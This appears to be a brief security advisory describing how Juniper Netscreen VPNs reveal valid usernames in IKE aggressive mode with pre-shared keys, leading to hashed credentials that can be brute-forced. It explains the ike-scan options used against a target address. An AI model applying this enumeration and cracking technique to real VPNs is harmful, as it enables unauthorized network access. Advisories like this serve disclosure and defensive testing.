The Juniper Netscreen VPN implementation will identify valid usernames in IKE aggressive mode, when pre-shared key authentication is used. This allows for attackers to obtain a list of valid VPN users. With a valid username, an attacker can obtain hashed credentials against which a brute force attack may be performed. A successful crack would mean that the attacker has complete access to the network.

The ike-scan options used in this example are:

-A Specify IKE Aggressive Mode. The default for ike-scan is
Main Mode.

-M Multiline: Display each payload on a separate line, which
makes the output easier to read.

--id=string Specify the string to be used for the ID payload.

10.0.0.1 The IP address of the target Netscreen.
